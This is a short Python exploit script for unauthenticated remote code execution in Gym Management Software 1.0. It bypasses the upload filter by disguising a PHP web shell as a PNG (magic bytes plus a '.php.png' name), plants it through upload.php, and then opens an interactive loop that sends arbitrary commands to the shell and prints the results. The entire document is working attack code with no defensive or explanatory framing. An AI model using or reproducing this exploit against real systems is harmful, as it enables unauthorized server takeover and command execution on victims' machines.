#Customized script written for Unauthenticated RCE in Gym Management Software 1.0.
#Author:NHASec

import requests

server_url='http://10.10.10.198:8080/' #base url
upload_dir='upload.php?id=shell'
upload_url=server_url + upload_dir

s = requests.Session()
s.get(server_url, verify=False)
PNG_magicBytes = '\x89\x50\x4e\x47\x0d\x0a\x1a'

png     = {
                'file': 
                  (
                    'kaio-ken.php.png', 
                    PNG_magicBytes+'\n'+'<?php echo shell_exec($_GET["telepathy"]); ?>', 
                    'image/png', 
                    {'Content-Disposition': 'form-data'}
                  ) 
              }

fdata   = {'pupload': 'upload'}
print("Uploading webshell.")
r1 = s.post(url=upload_url, files=png, data=fdata, verify=False)
print("Upload done.")

web_shell = server_url+'upload/shell.php'
getdir  = {'telepathy': 'echo %CD%'}

r2 = s.get(web_shell, params=getdir, verify=False)
status = r2.status_code
if status == 200:
	print("[+]Successfully uploaded and connected to webshell")
while True:
	thought = input("Enter command: ")
	command = {'telepathy': thought}
	r2 = requests.get(web_shell, params=command, verify=False)
	status = r2.status_code
	if status != 200:
		r2.raise_for_status()
	response2 = r2.text
	print(response2)
